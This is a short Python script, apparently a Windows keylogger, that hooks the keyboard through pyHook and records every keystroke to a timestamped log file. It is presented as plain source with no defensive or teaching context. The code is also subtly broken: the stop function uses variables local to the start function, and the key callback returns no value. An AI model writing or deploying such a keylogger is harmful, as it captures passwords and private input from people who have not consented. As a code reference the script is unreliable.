import pyHook
import pythoncom
import os
import datetime

def start_logging():
    log_file_name = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".log"
    log_file_path = os.path.join(os.getcwd(), log_file_name)
    log_file = open(log_file_path, 'w')
    
    def OnKeyboardEvent(event):
        log_file.write("Key: " + chr(event.Ascii) + " | Code: " + str(event.Ascii) + "\n")
    
    hook_manager = pyHook.HookManager()
    hook_manager.KeyDown = OnKeyboardEvent
    hook_manager.HookKeyboard()
    pythoncom.PumpMessages()

def stop_logging():
    hook_manager.UnhookKeyboard()
    log_file.close()